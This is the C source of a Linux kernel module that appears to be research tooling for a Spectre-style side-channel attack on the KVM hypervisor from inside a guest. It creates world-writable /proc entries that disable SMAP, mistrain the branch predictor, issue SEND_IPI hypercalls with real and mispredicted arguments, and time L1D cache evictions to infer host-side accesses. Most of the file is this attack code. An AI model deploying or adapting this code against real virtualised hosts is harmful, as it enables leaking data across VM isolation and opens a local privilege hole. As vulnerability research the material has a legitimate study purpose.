// You can only do hypercalls from ring 0, so this has to be a kernel module
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/types.h>

#include <linux/kvm_para.h>

#include "cache_eviction.h"
#include "hypercall.h"
#include "timing.h"

static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_send_ipi;
static struct proc_dir_entry *proc_measure_cache_eviction_set;

static inline __attribute__((always_inline)) void disable_smap(void) { __asm__ volatile("stac" ::: "cc"); }
static inline __attribute__((always_inline)) void enable_smap(void) { __asm__ volatile("clac" ::: "cc"); }

static inline __attribute__((always_inline)) void confuse_branch_predictor(void) {
  // Confuse the branch predictor
  asm volatile("movq $0, %%rcx\n"
               "cmpq $0, %%rcx\n"
               ".rept 300\n" // TODO: optimize this, maybe 300 is too much/too little?
               "je 1f\n"
               "1:\n"
               ".endr\n" ::
                   : "rcx", "cc");
}

static ssize_t send_ipi_write(struct file *file, const char __user *buff, size_t len, loff_t *off) {
  struct send_ipi_hypercall opts;

  // Make sure that only the size of the struct is written
  if (len != sizeof(opts)) {
    return -EINVAL;
  }

  // Copy the buffer from the user
  if (copy_from_user(&opts, buff, sizeof(opts))) {
    return -EFAULT;
  }

  confuse_branch_predictor();

  int type = KVM_HC_SEND_IPI;
  disable_smap();

  // Do the vmcall once with valid values
  evict_set_l1d(opts.ptr, opts.cache_set_idx);
  asm volatile("vmcall"
               : "+a"(type), "+b"(opts.real.mask_low), "+c"(opts.real.mask_low), "+d"(opts.real.min),
                 "+S"(opts.real.icr.raw_icr));

  // Flush our buffer
  clflush(opts.ptr);
  evict_set_l1d(opts.ptr, opts.cache_set_idx);

  // Do the vmcall, this time with the mispredicted buffer
  type = KVM_HC_SEND_IPI;
  asm volatile("vmcall"
               : "+a"(type), "+b"(opts.mispredicted.mask_low), "+c"(opts.mispredicted.mask_low),
                 "+d"(opts.mispredicted.min), "+S"(opts.mispredicted.icr.raw_icr));

  // Measure the access time
  size_t time = access_time(opts.ptr);
  enable_smap();
  return time;
}

static inline __attribute__((always_inline)) size_t
measure_vmcall_timing(int hypercall_number, unsigned long rbx, unsigned long rcx, unsigned long rdx,
                      unsigned long rsi) {
  volatile unsigned long time = hypercall_number;
  asm volatile(
      // rdtsc overwrites these, but they are also needed by the vmcall
      "push %%rdx\n"
      "push %%rax\n"

      // Start the timer
      "mfence\n"
      "lfence\n"
      "rdtsc\n"
      "lfence\n"

      // Store the start timestamp in r13 and restore
      // the vmcall parameters
      "movl %%eax, %%r13d\n"
      "pop %%rax\n"
      "pop %%rdx\n"

      "vmcall\n"

      // Stop the timer, and calculate the difference
      "lfence\n"
      "rdtsc\n"
      "subl %%r13d, %%eax\n"
      : "=a"(time)
      : "b"(rbx), "c"(rcx), "d"(rdx), "S"(rsi)
      : "r13");
  return time;
}

static const struct proc_ops send_ipi_fops = {
    .proc_write = send_ipi_write,
};

static ssize_t measure_cache_evict(struct file *file, const char __user *buf, size_t len, loff_t *offset) {

  const int iters = 10000;
  size_t base_line = 0;
  for (size_t i = 0; i < iters * 10; ++i) {
    disable_smap();
    confuse_branch_predictor();
    size_t time = measure_vmcall_timing(KVM_HC_SEND_IPI, -1, 0, -1, 0);
    base_line += time;
    enable_smap();
  }
  base_line /= iters * 10;
  pr_info("hypercall: base_line timing: %ld\n", base_line);

  for (int set_idx = 0; set_idx < 64; ++set_idx) {
    size_t avg = 0;
    for (size_t i = 0; i < iters; ++i) {
      disable_smap();
      confuse_branch_predictor();
      evict_set_l1d(buf, set_idx);
      size_t time = measure_vmcall_timing(KVM_HC_SEND_IPI, -1, 0, -1, 0);
      avg += time;
      enable_smap();
    }
    avg /= iters;
    if (avg > base_line) {
      pr_info("hypercall: set idx: %d\ttiming: %ld\n", set_idx, avg);
    }
  }

  pr_info("hypercall: cache measurement done!\n");

  // Check if it is a huge page address (doing a mask on the address)
  // Do the same vmcall twice and measure the timing of the latter to establish a base line
  // Evict first set
  // Start timer
  // vmcall
  // End timer
  // Evict second set
  // ...
  // List the sets that have higher timings
  return 0;
}

static const struct proc_ops cache_evict_fops = {
    .proc_write = measure_cache_evict,
};

static int __init hypercall_main(void) {
  const char *procfs_root_name = "hypercall";
  const char *procfs_ipi_name = "send_ipi";
  const char *procfs_cache_evict_name = "measure_cache_eviction_set";

  // Initialize the root procfs entry
  proc_root = proc_mkdir(procfs_root_name, NULL);
  if (!proc_root) {
    proc_remove(proc_root);
    pr_alert("hypercall: Error: Could not initialize /proc/%s\n", procfs_root_name);
    return -ENOMEM;
  }

  // Initialize the send_ipi entry
  proc_send_ipi = proc_create(procfs_ipi_name, 0666, proc_root, &send_ipi_fops);
  if (!proc_send_ipi) {
    proc_remove(proc_send_ipi);
    proc_remove(proc_root);
    pr_alert("hypercall: Error:Could not initialize /proc/%s/%s\n", procfs_root_name, procfs_ipi_name);
    return -ENOMEM;
  }

  // Initialize the measure_cache_eviction_set entry
  proc_measure_cache_eviction_set = proc_create(procfs_cache_evict_name, 0666, proc_root, &cache_evict_fops);
  if (!proc_measure_cache_eviction_set) {
    proc_remove(proc_measure_cache_eviction_set);
    proc_remove(proc_send_ipi);
    proc_remove(proc_root);
    pr_alert("hypercall: Error: Could not initialize /proc/%s/%s\n", procfs_root_name,
             procfs_cache_evict_name);
    return -ENOMEM;
  }

  pr_info("hypercall: procfs entries created\n");

  return 0;
}

static void __exit hypercall_exit(void) {
  proc_remove(proc_measure_cache_eviction_set);
  proc_remove(proc_send_ipi);
  proc_remove(proc_root);
  pr_info("hypercall: procfs entries removed\n");
}

module_init(hypercall_main);
module_exit(hypercall_exit);
MODULE_LICENSE("GPL");
